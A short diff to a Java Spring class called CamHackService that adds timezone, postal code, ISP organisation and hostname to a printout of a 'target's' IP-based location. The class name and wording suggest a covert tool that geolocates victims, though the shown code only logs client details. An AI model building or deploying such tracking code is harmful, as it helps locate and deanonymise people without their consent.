@@ -5,8 +5,6 @@ import org.springframework.stereotype.Service;
 import org.springframework.util.StringUtils;
 import org.springframework.web.multipart.MultipartFile;
 
-import java.io.File;
-import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 
@@ -33,12 +31,21 @@ public class CamHackService {
         String city = clientInfo.getCity();
         String region = clientInfo.getRegion();
         String country = clientInfo.getCountry();
+        String timezone = clientInfo.getTimezone();
+        String postal = clientInfo.getPostal();
+        String org = clientInfo.getOrg();
+        String hostname = clientInfo.getHostname();
         System.out.printf("""
                 target ip : %s,
                 target city : %s,
                 target region : %s,
                 target country : %s
-                %n""", clientIp,city,region,country);
+                target timezone : %s
+                target postal : %s
+                target org : %s
+                target host : %s
+                %n""",
+                clientIp,city,region,country,timezone,postal,org,hostname);
     }
 
 
